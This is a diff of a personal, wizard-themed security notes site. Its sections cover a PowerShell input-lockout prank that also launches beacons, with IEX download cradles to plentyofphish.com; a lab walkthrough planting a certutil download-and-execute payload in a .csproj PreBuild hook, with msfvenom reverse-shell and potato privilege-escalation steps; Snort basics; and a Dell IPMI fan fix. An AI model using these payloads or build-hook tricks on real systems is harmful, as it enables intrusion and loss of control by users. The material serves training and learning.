@@ -89,7 +89,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded "><a href="Wizardintro.html"><strong aria-hidden="true">1.</strong> A Wizards Legacy</a></li><li class="chapter-item expanded "><a href="Tome1.html"><strong aria-hidden="true">2.</strong> Tome one, Terminal trolling</a></li><li class="chapter-item expanded "><a href="Tome22.html"><strong aria-hidden="true">3.</strong> Tome two, Powershell Hexing</a></li><li class="chapter-item expanded "><a href="Tome3.html"><strong aria-hidden="true">4.</strong> Tome three, Embedded magic</a></li></ol>
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="Wizardintro.html">A Wizards Legacy</a></li><li class="chapter-item expanded affix "><li class="spacer"></li><li class="chapter-item expanded "><div><strong aria-hidden="true">1.</strong> Offensive Focus</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="Tome1.html"><strong aria-hidden="true">1.1.</strong> Terminal trolling</a></li><li class="chapter-item expanded "><a href="Tome22.html"><strong aria-hidden="true">1.2.</strong> Powershell Hexing</a></li><li class="chapter-item expanded "><a href="Tome2.html"><strong aria-hidden="true">1.3.</strong> Git with vengeance</a></li></ol></li><li class="chapter-item expanded "><li class="spacer"></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Defensive Focus</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="TomeBooger.html"><strong aria-hidden="true">2.1.</strong> Booger Goblin</a></li></ol></li><li class="chapter-item expanded "><li class="spacer"></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Development Focus</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="Tome3.html"><strong aria-hidden="true">3.1.</strong> Embedded magic</a></li></ol></li><li class="chapter-item expanded "><li class="spacer"></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Infrastructure Focus</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="Tome5.html"><strong aria-hidden="true">4.1.</strong> A Dell Incantation</a></li></ol></li><li class="chapter-item expanded "><li class="spacer"></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.</strong> Forbidden Wizard Magics</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">5.1.</strong> PlaceHolder</div></li></ol></li><li class="chapter-item expanded "><li class="spacer"></li><li class="chapter-item expanded "><div><strong aria-hidden="true">6.</strong> Yapping Crystal</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="Tome4.html"><strong aria-hidden="true">6.1.</strong> A Wizards Jade</a></li><li class="chapter-item expanded "><a href="ics/ics1.html"><strong aria-hidden="true">6.2.</strong> A tale of Trains</a></li></ol></li><li class="chapter-item expanded "><li class="spacer"></li></ol>
             </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
         </nav>
@@ -153,7 +153,7 @@
                     <main>
                         <h1 id="pondering-the-first-orb"><a class="header" href="#pondering-the-first-orb">Pondering the first orb</a></h1>
 <p><img src="attachments/Wickedwizard.jpeg" alt="Wizard Intro" /></p>
-<p>Hello fellow purveyor of the cyber arts. This is a rough collections of a wizards journey.</p>
+<p>Hello, fellow of the cyber arts. This is a rough collections of a wizards journey. I will post serious and joking things on here. This is more for me than it is for you. However if you find this useful then side quest complete.</p>
 <p>Some minor lexicon confirmation is below</p>
 <div class="table-wrapper"><table><thead><tr><th>Color</th><th>Role</th></tr></thead><tbody>
 <tr><td>RED</td><td>Offensive Focus</td></tr>
@@ -179,7 +179,7 @@ def main(screen):
     screen.clear()
     cap = cv2.VideoCapture(0)
     if not cap.isOpened():
-        raise IOError(&quot;Cannot open Webcam stream!&quot;)
+        raise IOError("Cannot open Webcam stream!")
     while True:
         # Capture from webcam
 
@@ -198,14 +198,14 @@ def main(screen):
                 gscale.append(sum)
                 gscale.append(sum)
         # Covert Gray to ASCII
-        #color = &quot;$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\\|()1{}[]?-_+~&lt;&gt;i!lI;:,\&quot;^`'.&quot;[::-1]
-        #color = &quot;0QLCJUYXzcvunxrjft/\\|()1{}[]?-_+~&lt;&gt;i!lI;:,\&quot;^`'. &quot;[::-1]
-        color = &quot;@%&amp;$#!;:*\,. &quot;[::-1]
+        #color = "$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\\|()1{}[]?-_+~&lt;&gt;i!lI;:,\"^`'."[::-1]
+        #color = "0QLCJUYXzcvunxrjft/\\|()1{}[]?-_+~&lt;&gt;i!lI;:,\"^`'. "[::-1]
+        color = "@%&amp;$#!;:*\,. "[::-1]
         colorArray = list(color)
         colorlength = len(colorArray)
         interval = colorlength/256
 
-        chars = [&quot;@&quot;, &quot;%&quot;, &quot;&amp;&quot;, &quot;$&quot;, &quot;#&quot;, &quot;*&quot;, &quot;&amp;&quot;, &quot;~&quot;, &quot;:&quot;, &quot;.&quot;, &quot; &quot;]
+        chars = ["@", "%", "&amp;", "$", "#", "*", "&amp;", "~", ":", ".", " "]
         chars.reverse()
         ascii_px = [chars[pixel//25] for pixel in gscale]
         #ascii_px = [colorArray[math.floor(pixel*interval)] for pixel in gscale]
@@ -228,20 +228,20 @@ wrapper(main)
 <p>Added other character lists that can be used but the one on right now just looks the best.</p>
 <hr />
 <p>So the way it stands right now using socat we can pipe the program over TCP for remote playing. IE you can just host your webcam to a target box.</p>
-<pre><code class="language-shell">sudo socat TCP4-LISTEN:80 EXEC:&quot;python3.11 ./ascii-web.py&quot;
+<pre><code class="language-shell">sudo socat TCP4-LISTEN:80 EXEC:"python3.11 ./ascii-web.py"
 </code></pre>
 <p>Clarity of the terminal is based off your host font size. Which is strange.</p>
-<p>For the target box we can just use a <code>netcat</code> to grab the output of said </p>
+<p>For the target box we can just use a <code>netcat</code> to grab the output of said</p>
 <hr />
 <p>Upgraded socat hosting?</p>
-<pre><code class="language-shell">socat -d TCP4-LISTEN:80,reuseaddr,fork EXEC:&quot;python3.11 ./ascii-web.py&quot;
+<pre><code class="language-shell">socat -d TCP4-LISTEN:80,reuseaddr,fork EXEC:"python3.11 ./ascii-web.py"
 </code></pre>
 <p>Idea here is to allow the process to get forked. However I am also not sure if that is a good idea. Might allow the computer to be resource attacked by a bunch of connections just ZERG rushing it.</p>
-<p>Below is recon for PTS terminal windows </p>
-<pre><code class="language-shell">who -a;echo&quot;&quot;; ps -aux | grep &quot;.*pts.*&quot;
+<p>Below is recon for PTS terminal windows</p>
+<pre><code class="language-shell">who -a;echo""; ps -aux | grep ".*pts.*"
 </code></pre>
 <hr />
-<p>Here is what the poor blue team would see waving back to them on a Terminal that they cannot clear! The only option is to kill the shell. </p>
+<p>Here is what the poor blue team would see waving back to them on a Terminal that they cannot clear! The only option is to kill the shell.</p>
 <p><img src="attachments/ascii.jpg" alt="Wizard_Render" /></p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="powershell-hexing-for-rookies"><a class="header" href="#powershell-hexing-for-rookies">Powershell Hexing for Rookies</a></h1>
 <p>Spell Class : Black Magic</p>
@@ -249,7 +249,7 @@ wrapper(main)
 <hr />
 <p>This was a very bad working PoC about powershell lock outs and doing some direct DLL manipulation.</p>
 <p>Below is a .ps1 script that would drop this below script, A video, and a dumb beacon.</p>
-<p>The goal of this was to act as a Hacktavist or some skid effect on a computer. It was very dumb but it was a perfect payload to mimic low skill and low complexity attack. </p>
+<p>The goal of this was to act as a Hacktavist or some skid effect on a computer. It was very dumb but it was a perfect payload to mimic low skill and low complexity attack.</p>
 <h3 id="how-it-works"><a class="header" href="#how-it-works">How it works</a></h3>
 <ol>
 <li>
@@ -265,13 +265,13 @@ wrapper(main)
 <p>I then have the Windows media player Open the Media file, Then close the file. At the time I did this to solve a bug in the way it opens files.</p>
 </li>
 <li>
-<p>Working with the proc var I made it brings the Windows MediaPlayer and plays the video. </p>
+<p>Working with the proc var I made it brings the Windows MediaPlayer and plays the video.</p>
 </li>
 <li>
-<p>Now we see the DLLImport for user32.Dll I am calling very poorly the BlockIt function. Setting that to true disables all user32 input. Mouse, Keyboard, Touchscreen and anything else handled on the user. </p>
+<p>Now we see the DLLImport for user32.Dll I am calling very poorly the BlockIt function. Setting that to true disables all user32 input. Mouse, Keyboard, Touchscreen and anything else handled on the user.</p>
 </li>
 <li>
-<p>We see some mocking of the user and a sleep timers for 86 seconds. Once that is finished we return the BlockInput to false and fire off two CS beacons that are laying in wait online. </p>
+<p>We see some mocking of the user and a sleep timers for 86 seconds. Once that is finished we return the BlockInput to false and fire off two CS beacons that are laying in wait online.</p>
 </li>
 </ol>
 <pre><code class="language-Powershell">
@@ -289,21 +289,21 @@ Set-Content -Path $profile -Value $content
 
 
 Set-CoAdd-Type -AssemblyName presentationCore
-$filepath = &quot;C:\Windows\Temp\trap.mp4&quot;
+$filepath = "C:\Windows\Temp\trap.mp4"
 $wmplayer = New-Object System.Windows.Media.MediaPlayer
 $wmplayer.Open($filepath)
 Start-Sleep 1 
 $duration = $wmplayer.NaturalDuration.TimeSpan.Seconds
 $wmplayer.Close()
 start playing
-$proc = Start-process -FilePath &quot;C:\Program Files (x86)\Windows Media Player\wmplayer.exe&quot; -ArgumentList $filepath -PassThru
+$proc = Start-process -FilePath "C:\Program Files (x86)\Windows Media Player\wmplayer.exe" -ArgumentList $filepath -PassThru
 
 
 
 # This Bit locks the user out for 86 seconds
 
 $code = @'
-    [DllImport(&quot;user32.dll&quot;)]
+    [DllImport("user32.dll")]
         public static extern bool BlockInput(bool fBlockIt);
 '@
         
@@ -312,7 +312,7 @@ $code = @'
         
         $null = $userInput::BlockInput($true)
         
-Write-Warning &quot;You have just fell for the trap...&quot;
+Write-Warning "You have just fell for the trap..."
 
         Start-Sleep -Seconds 86
         
@@ -323,28 +323,258 @@ Write-Warning &quot;You have just fell for the trap...&quot;
 
 Set-StrictMode -Version 2
 
-#powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring('http://plentyofphish.com:80/traptime'))&quot;
-#powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring('http://plentyofphish.com:80/.exe'))&quot;
+#powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://plentyofphish.com:80/traptime'))"
+#powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://plentyofphish.com:80/.exe'))"
 
 #Runs above payloads
 
 </code></pre>
 <p>Once again this is very low and very poor. I wanted to throw this away but all information has value to someone and as such I hope you find some value in this poorly crafted spell. Good news however is it means we can work from here and build something far far worse now that we can get into the concept of ASM and maybe some malicious payloads.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="git-with-vengeance"><a class="header" href="#git-with-vengeance">Git with vengeance</a></h1>
+<p>Build a solution from Visual Studio code. C# project will do.</p>
+<p>Right click on the project and go to the build section.</p>
+<p>Load a payload into the pre-compile actions.
+Which can be found in the picture below. This is located at <code>*.csproj</code>
+<img src="attachments/Pastedimage20231005201455.png" alt="Payload" /></p>
+<p>Utilizing the PreBuild tag, the Exec command = PAYLOAD</p>
+<hr />
+<p>First attempt failed, Reverse shell in the Prebuild is crashing or having some kind of issue.</p>
+<p>Need to change from powershell reverse shell into a MSFpayload with metasploit</p>
+<p><img src="attachments/Pasted%20image%2020231005211129.png" alt="Reverseshell" />
+Build failed (Sad Trombone)
+But what did work was getting wells correct .sln file.</p>
+<pre><code class="language-pre">  &lt;Target Name="PreBuild" BeforeTargets="PreBuildEvent"&gt;
+    &lt;Exec Command="certutil -f -urlcache http://10.10.14.4:6969/plz.exe c:\users\public\plz.exe&amp;#xD;&amp;#xA;c:\users\public\plz.exe" /&gt;
+</code></pre>
+<p>This is how inside the .csproj we get the payload to fire.</p>
+<p>Payload was</p>
+<pre><code class="language-msfvenom">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=9001 -f exe -o plz.exe
+
+</code></pre>
+<p>Listener was</p>
+<pre><code class="language-msfconsole">sfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/
+reverse_tcp; set lhost 10.10.14.4; set lport 9001; exploit"
+</code></pre>
+<p><img src="attachments/Pasted%20image%2020231005231302.png" alt="Serverpull" /></p>
+<p>This is the server yanking the files from me and finally executing my staged payload.</p>
+<p>Doing some WinPEAS we can find the service XAMPP hosting the webpage we interact with</p>
+<p>Doing</p>
+<pre><code>C:\ dir /B /S index.php 
+</code></pre>
+<p>We can find the Area for the webpage we have been interacting with</p>
+<p><img src="attachments/Pasted%20image%2020231005231850.png" alt="IMAGE" /></p>
+<p>From here we can replace the submit.php file with a php webshell</p>
+<p>From the some of our shells we can use certutil.exe to bring another staged payload to the box, but host it on another port.</p>
+<p><img src="Pasted%20image%2020231005232038.png" alt="img" /></p>
+<p>From here we can use the webshell we moved onto the box. Browse to the /submit.php</p>
+<p><img src="attachments/Pasted%20image%2020231005232132.png" alt="img" /></p>
+<p>We now have the access level of <img src="attachments/Pasted%20image%2020231005232257.png" alt="img" /></p>
+<p>Nice but not quite what we need. Working with dabois we found FullPower.exe</p>
+<p>https://github.com/itm4n/FullPowers
+On Windows, some services executed as <code>LOCAL SERVICE</code> or <code>NETWORK SERVICE</code> are configured to <strong>run with a restricted set of privileges</strong>. Therefore, even if the service is compromised, <strong>you won't get the golden impersonation privileges</strong> and privilege escalation to <code>LOCAL SYSTEM</code> should be more complicated. However, I found that, when you <strong>create a scheduled task</strong>, the new process created by the <strong>Task Scheduler Service</strong> has <strong>all the default privileges</strong> of the associated user account (except <em>SeImpersonate</em>). Therefore, with some token manipulations, you can spawn a new process with all the missing privileges.</p>
+<p>So once we run that we now have the ability to gain SEimpersonate YIPEEE</p>
+<p>Now using Tylers WICKED updated SIGMA POTATO https://github.com/tylerdotrar/SigmaPotato Which he lovingly built in with a revshell.</p>
+<p>FullPower.exe; SigmaPotato.exe --revshell IP PORT</p>
+<p><img src="attachments/Pasted%20image%2020231005232627.png" alt="img" /></p>
+<p>YEEEEE</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="the-booger-goblin-project"><a class="header" href="#the-booger-goblin-project">The booger goblin project</a></h1>
+<p>Spell Class : Blue Magic</p>
+<p>Spell Level : Introduction</p>
+<p>Topics : Python, Snort</p>
+<hr />
+<h1 id="why-is-it-always-snort"><a class="header" href="#why-is-it-always-snort">Why is it always Snort?</a></h1>
+<p>So I was forced to attent a training on Detection and Counter Intrustion. TLDR; It was aweful and outdated by an impressive amount. Using such an old version of Security Onion was not even familar with how to login to the service. After our blocks of instruction I had a breaking point when it was told to me that inputing rules by hand was the best way to do it. After picking up my jaw from the floor I set about browsing to the Snort Documentation and setting up the basics of what makes a rule.</p>
+<p>https://docs.snort.org/rules/</p>
+<pre><code class="language-snort rule">alert tcp $EXTERNAL_NET 80 -&gt; $HOME_NET any
+(
+    msg:"Attack attempt!";
+    flow:to_client,established;
+    file_data;
+    content:"1337 hackz 1337",fast_pattern,nocase;
+    service:http;
+    sid:1;
+)
+</code></pre>
+<h3 id="what-makes-a-rule"><a class="header" href="#what-makes-a-rule">What makes a rule</a></h3>
+<p>For snort3 I make a little chart for myself.</p>
+<ul>
+<li>step one   : Rule Action https://docs.snort.org/rules/headers/actions <code>**alert** tcp $EXTERNAL_NET 80 -&gt; $HOME_NET any</code></li>
+<li>alert</li>
+<li>block</li>
+<li>drop</li>
+<li>log</li>
+<li>react</li>
+<li>reject</li>
+<li>rewrite</li>
+<li>step two   : Protocol https://docs.snort.org/rules/headers/protocols <code>alert **tcp** $EXTERNAL_NET 80 -&gt; $HOME_NET any</code></li>
+<li>ip</li>
+<li>icmp</li>
+<li>tcp</li>
+<li>udp</li>
+<li>step three : IP Source / Dest https://docs.snort.org/rules/headers/ips <code>alert tcp **$EXTERNAL_NET** 80 -&gt; **$HOME_NET** any</code></li>
+<li>any</li>
+<li>!192.168.1.1 (Inverse operator)</li>
+<li>[192.168.1.0/24] (Range Operator)</li>
+<li>$TEST (Variable's)</li>
+<li>step four  : Port https://docs.snort.org/rules/headers/ports <code>alert tcp $EXTERNAL_NET **80** -&gt; $HOME_NET **any**</code></li>
+<li>any</li>
+<li>$TEST (Variable's )</li>
+<li>: (Range Operator) 1:10 (Between 1 and 10) :100 (Less than or Equal to 100) 100: (Greather than or equal to 100)</li>
+<li>step five  : Direction https://docs.snort.org/rules/headers/directions <code>alert tcp $EXTERNAL_NET 80 **-&gt;** $HOME_NET any</code></li>
+<li>-&gt; Source to Destination</li>
+<li>&lt;&gt; bidirectional</li>
+</ul>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="embedded-systems-and-you"><a class="header" href="#embedded-systems-and-you">Embedded systems and you</a></h1>
-<p>I am strung between many things at this point in my life. Listed as Armed and Dangerous, Fugitive wizard at large. Spending some time in the dungeons and finally getting to have my time before the tribunal was a great time to focus my wildly attention. I feel stronger and sharper as of late. Like I have a direction to follow once again. That direction has been pushing to delve once again into the topics I do not understand. </p>
-<p>The dreaded art of Embedded Systems. </p>
+<p>I am strung between many things at this point in my life. Listed as Armed and Dangerous, Fugitive wizard at large. Spending some time in the dungeons and finally getting to have my time before the tribunal was a great time to focus my wildly attention. I feel stronger and sharper as of late. Like I have a direction to follow once again. That direction has been pushing to delve once again into the topics I do not understand.</p>
+<p>The dreaded art of Embedded Systems.</p>
 <p>Lets thrown on some Time Fragment - 装甲艦 and learn some strangeness.</p>
 <p>Getting I had to order from the mages guild some ESP8266's, ESP32's, and some digikey sparks. With my small boards I had to learn about some rather simple but obscure knowledge.</p>
 <h3 id="inscriptions-for-an-inscriber"><a class="header" href="#inscriptions-for-an-inscriber">Inscriptions for an inscriber</a></h3>
 <p>A small bit of magic works between the main chip on the board and your computer. This might be a CH340 or <em>INSERT OTHER HERE</em></p>
-<p>What these little dude do for you is convert between USB (Your Computer) and Serial (The ESP32, ESP8266 or whatever). This is our friend but we must know which friend we need to learn to speak with. I found out by asking my system. </p>
+<p>What these little dude do for you is convert between USB (Your Computer) and Serial (The ESP32, ESP8266 or whatever). This is our friend but we must know which friend we need to learn to speak with. I found out by asking my system.</p>
 <p><img src="attachments/lsusb.png" alt="Wizard_Render" /></p>
 <p>Using <code>sudo lsusb -t</code> you can get the above. I know I have ch341 that is handling that communication. I can also double check that I am able to see this device by looking in DEV.</p>
 <p><img src="attachments/tty.png" alt="Wizard_Render" /></p>
-<p>Using <code>ls /dev</code> and I can see the ttyUSB0 device which would be present due to the UART to USB CH341 chip. </p>
+<p>Using <code>ls /dev</code> and I can see the ttyUSB0 device which would be present due to the UART to USB CH341 chip.</p>
 <h3 id="arduino-the-savior-for-beginning"><a class="header" href="#arduino-the-savior-for-beginning">Arduino the savior for beginning</a></h3>
-<p>Moving into the space of we understand our chip and our interface tool. We can now begin to attempt and pass instructions to this chip which should relay that to the ESP8266 in my situation. </p>
-<p><code>yay arduino</code> was all it took for me to install Arduino, if you are not using pacman or yay please find your own solution to this issue. </p>
+<p>Moving into the space of we understand our chip and our interface tool. We can now begin to attempt and pass instructions to this chip which should relay that to the ESP8266 in my situation.</p>
+<p><code>yay arduino</code> was all it took for me to install Arduino, if you are not using pacman or yay please find your own solution to this issue. After spending some time working with ESP8266's and making some little wifi point that can be used for new students to practice wifi hacking. It really is a great platform for development. It can take some setting up but once you do it a couple of times it does make for a nice setup.</p>
+<hr />
+<h2 id="embedded-shinanigans"><a class="header" href="#embedded-shinanigans">Embedded Shinanigans</a></h2>
+<p>Figuring out some nice project I watched the michael reeves video on making a little turret. It was funny but it was also a increadbly simple project to do with a lot of fun to motivate you to complete it. Which in if you have not taking note of yet. Fun is often the determination of completion or not. You can chase a project but once you learn what you need you tend to drop a project unless it has some fun to it in which you often will push to completion.</p>
+<p>So we have an X and a Y we must focus on.
+[-] X is how we will turn Left and Right.
+[-] Y is how we will move up and down.</p>
+<p>With these two and a small laser we can show our ability to send and process data.. I am using Rust as my main way of processing computer data and then all the arduino has to do is intake information and adjust the motors/servos to reflect the values..</p>
+<p>I know from michaels video he had an issue with the arudino being unable to process the amount of information being sent. So I want to lower the amount of processing we send to the arduino..</p>
+<p>So some kind of checking system to manage sending updates.. So I am thinking something like "Hey I have information" -&gt; "Okay well if its not greater than x% of change then we will not send it" -&gt; "If it is then we will send it" I am thinking while this might reduce accuracy it will lower the load on the arduino...</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="dellservergpufanissue"><a class="header" href="#dellservergpufanissue">DellserverGPUfanissue</a></h1>
+<p>Read my story to fix your issue.</p>
+<p>Sorry for the wizard fun but I hate dry write ups and you can just copy paste and ignore my rambling.</p>
+<h2 id="chapter-1-the-problem"><a class="header" href="#chapter-1-the-problem">Chapter 1, The problem</a></h2>
+<hr />
+<p>Welcome fellow techno sewergoblin. If you found this then you too have put an unsuppored GPU inside of that wonderful dell server you are about to commit unholy sins against in the persuit of the perfect homelab.</p>
+<p>The bad news. That fan sucks mega butts contantly trying to take off with its fans spinning at like 75 to 85 percent for NO REASON.. Well as it turns out there is a reason and I had to ponder some Old arcane tomes to understand the issue.</p>
+<h2 id="chapter-2-pondering-old-orbs"><a class="header" href="#chapter-2-pondering-old-orbs">Chapter 2, Pondering old orbs</a></h2>
+<hr />
+<p>Deep in the back pages of spiceworks fourms. In the year of our lord 2023 I stumbled into this.</p>
+<p>https://community.spiceworks.com/topic/613098-dell-poweredge-server-r7xx-series-fan-speed-with-gpu</p>
+<p>Full of wizard sharing in their woes as one mighty hero would deliver us from our struggles. SUFFER NO MORE this hero said. <em>alexrozentuller</em> you mighty wizard! I salute you.</p>
+<pre><code>Dell traced the issue back to a setting for how they handle unmatched devices.  They were able to run the following IPMI command on my 730's to resolve the issue:
+
+ipmitool.exe -H 172.16.171.21 -U root -P calvin raw 20 30 0x00 ce 0 0x16 5 0 0 0 5 0 1 0 0    &gt; Set Unmatched Logic Disabled
+
+*** USE AT YOUR OWN RISK ***﻿
+
+﻿Dell was very hesitant to provide me with the above command, so it is not official by any means.  I forwarded the details to Teradici under ticket reference: #15134-33400.  ﻿I would give them a ring first.
+
+If that doesnt get you anywhere, i provided my Dell ticket in an earlier post: SER# 81901735650.﻿  See if you can reference that with Dell directly.
+
+Good Luck!
+
+</code></pre>
+<p>As we gaze at this script of old we find the command and values we need.</p>
+<pre><code>ipmitool -I lanplus -H &lt;IP of the IDRAC&gt; -U &lt;user&gt; -P &lt;password&gt; raw 0x30 0xce 0x00 0x16 0x05 0x00 0x00 0x00 0x05 0x00 0x01 0x00 0x00
+</code></pre>
+<p>Ah and here we have a great example of PRIME magic, This is undistilled wizard juice. The good stuff.</p>
+<h2 id="chapter-3-tapping-ancient-power"><a class="header" href="#chapter-3-tapping-ancient-power">Chapter 3, Tapping ancient power</a></h2>
+<hr />
+<p>With our new found words of power we must build our foundation.</p>
+<p>Step 1. Log into your dell IDRAC</p>
+<p>Step 2. Once Logged in on the left hand side under IDRAC Settings, click on User Authentication</p>
+<p>Step 3. Make a user with a password containing no symbols, Down one box should be IPMI USSER PRIVILEGES, set Maximum LAN User Privilege Granted to Administrator.</p>
+<p>Step 4. Hit APPLY</p>
+<p>Step 5. On the Far Left hand side under iDRAC SETTINGS, Select Network, Scroll to the bottom and located the IPMI Settings, check the box for Enable IPMI Over LAN</p>
+<p>Step 6. Hit APPLY</p>
+<p>We have now pregamed the server for IPMI wizard magic. Let us now begin the incantation.</p>
+<h2 id="chapter-4-activating-ancient-power"><a class="header" href="#chapter-4-activating-ancient-power">Chapter 4, Activating ancient power</a></h2>
+<hr />
+<p>I am using Endevour OS, so let me tip my wizard hat because I used arch BTW.</p>
+<pre><code>yay ipmitool  &lt; yay wizards
+
+apt-get install ipmitool &lt; Normal Linux users
+</code></pre>
+<p>if you want to self compile
+https://github.com/ipmitool/ipmitool</p>
+<p>For all my powershell surfers here is the windows Dell support pack
+https://www.dell.com/support/home/en-us/drivers/driversdetails?driverid=w9nmr</p>
+<p>once you have ipmitools let me give a rundown on the actual command, You could spare me this pain and read the man page or the -h but here it is anyway</p>
+<p>ipmitool -I lanplus -H <IP of the IDRAC> -U <user> -P <password> raw 0x30 0xce 0x00 0x16 0x05 0x00 0x00 0x00 0x05 0x00 0x01 0x00 0x00</p>
+<p>-I is the interface method
+-H is the ip of your iDrac
+-U is the user with ipmi permissions
+-P is password
+Raw is the data type</p>
+<p>0x30 0xce 0x00 0x16 0x05 0x00 0x00 0x00 0x05 0x00 0x01 0x00 0x00
+This above is Set Third-Party PCIe Card Default Cooling Response Logic To Disabled</p>
+<p>Mad shout out to <em>mikemattran</em> for the Disable, Enable, and Status codes</p>
+<pre><code>Set Third-Party PCIe Card Default Cooling Response Logic To Disabled
+
+ipmitool -I lanplus -H -U -P raw 0x30 0xce 0x00 0x16 0x05 0x00 0x00 0x00 0x05 0x00 0x01 0x00 0x00 
+
+Set Third-Party PCIe Card Default Cooling Response Logic To Enabled
+
+ipmitool -I lanplus -H -U -P raw 0x30 0xce 0x00 0x16 0x05 0x00 0x00 0x00 0x05 0x00 0x00 0x00 0x00 
+
+Get Third-Party PCIe Card Default Cooling Response Logic Status
+
+ipmitool -I lanplus -H -U -P raw 0x30 0xce 0x01 0x16 0x05 0x00 0x00 0x00 
+
+The response data is:
+
+16 05 00 00 00 05 00 01 00 00 (Disabled)
+
+﻿16 05 00 00 00 05 00 00 00 00 (Enabled)
+</code></pre>
+<p>Once the dust settles and peace returns to your wizard homelab. We can all take a deep breath as we are free from the loathsum Dell GPU fan curse.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="wizards-jade"><a class="header" href="#wizards-jade">Wizards jade</a></h1>
+<p>Hello apprentices of all ages. Let us take for a minute and thank those that came before. Wizards of Yore left us the ability to cast into all of time our thoughts. What a blessing it is. Anyway poetic waxing out of the way.</p>
+<p>Crafting some payloads for Microsoft Office can take many forms. With the advancements made by Windows we now have the Mark of the Web (MOTW) Here we can see the first line of defense protecting users from the most basic of Phishing, Granted this is only in effect if the Defender of said network have disabled the now DEFAULT setting of alerting users of Windows Macros that do not come from internal emails, domain locations or with certs signed by some internal team.</p>
+<p>This must be disabled as it is now enabled by DEFAULT!!</p>
+<p>Let us deconstruct these incantations,<br />
+<img src="attachments/MOTW.png" alt="Wizard_Render" />
+In the above picture we can see an example of the dreaded ZoneId=3</p>
+<ul>
+<li>ZoneId=0: Local machine.</li>
+<li>ZoneId=1: Local intranet.</li>
+<li>ZoneId=2: Trusted sites.</li>
+<li>ZoneId=3: Internet.</li>
+<li>ZoneId=4: Restricted sites.</li>
+</ul>
+<p>MSDN in its classic Necronomicon like nature will hint but never outright tell us the dang answer.
+https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms537183(v=vs.85)</p>
+<p>But we can see the structure is the same as the methods used for Safe internet browsing.</p>
+<p>So its been a bit and coming back to this it is making less sense for this to be done from outside the domain. However, I will never discount the method. Its just becoming more and more difficult for people to click enable macro's now that is to say once you make entry on a network being sent from internal is a really nice strat. Doing the OSEP has you do something similar but I enjoy the process of enumerating users via the mail server with manual interaction.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="running-a-train-with-the-homies"><a class="header" href="#running-a-train-with-the-homies">Running a train with the homies.</a></h1>
+<p>Wizard Groups in attendance: The Cyber Threat Emulators wizard court, And my current home which I shall dub the Contractor wizard court.</p>
+<p>This is my first venture into the ugly world of ICS on mobile metal boxes. While my fellow wizard homies made it quite apparent that our hexes and incantations have inflicted havoc before on ICS of a more static variety. This was to be my very first venture into this dark and dank world. ICS is often spoken of in hushed tones full of woe and dispare among cyber wizards. Many of our kind tell harrowing tales of encountering machines beyond time and space. Networks of old held together by the most archaic networking magics. I am filled with hope and youthful energies at the chance to see such great works. This shall be my recording of these events.</p>
+<h2 id="preparing-for-an-odyssey"><a class="header" href="#preparing-for-an-odyssey">Preparing for an odyssey.</a></h2>
+<p>We must prepare as we have been given our topics.</p>
+<ol>
+<li>Python(requests, scapy, pyrtlsdr, pyshark, BACpypes)</li>
+<li>Network Recon(nmap, masscan)</li>
+<li>Wireless Surveys(Kismet, Airodump-ng)</li>
+<li>Payload Building(msfvenom, empire, veil)</li>
+<li>PCAP Analysis (Wireshark, Tcpdump)</li>
+<li>Vulnerability Scanning(OpenVAS, Nessus, nmap NSE Scripts, openscap, lynis)</li>
+<li>SQL Injection(sqlmap, OWASP ZAP)</li>
+</ol>
+<p>As a small court of wizards the time to start researching and obsessing over trains like true enlightened individuals had begun. We searched all over the internet for videos related to train control systems. Abusing the usual suspects we got a ton of important information in relation to most of the ICS environments. FCC submittions and documentation proved to be very eye opening into the way that these systes act and work. We learned critical frequency channels, methods of communication, and how the system should work. We know from many many lectures and talks on the matter that safety is number one. Which means the systems should default to a safe standby. While I always want a secure first approach in the matter of public transit the idea of safety should come first. This does however leave us with issues we must talk about.</p>
+<h2 id="saftey-first"><a class="header" href="#saftey-first">Saftey first</a></h2>
+<p>The concept of saftey above all means security will take a backseat. This backseat is going to be in the form of in an unsure situation a train must come to a stop. This is to ensure human life is the most protected asset. Avoid harm at all costs. This puts into my mind the concept of any method that might be used to alert the trains to situations where human harm might be possible should be robust and simple. Less parts of the system would translate into easy of use and less prone to faults. However, welcome to the real world where issues are constant with these systems. This is not slander on the makers of systems but the constant pressure you see from mis-management of projects.</p>
+<h2 id="public-transparency"><a class="header" href="#public-transparency">Public transparency</a></h2>
+<p>The public always has a right to know and understand the methods and processes behind the means to transportation we trust our lives with. The concept of hiding information is a valid one for many systems and methods. Not letting the public know how certain critical infrastructure works to prevent abuse by outside actors has a lot of validity. However as a saftey first mentality we must release the methods and systems. The release of this critical information is a danger due to the ability of someone with malicious intent or simulated intent can as we showcase make use of this public information to cause failures in a system resulting in some very bad times for a sensitive system.</p>
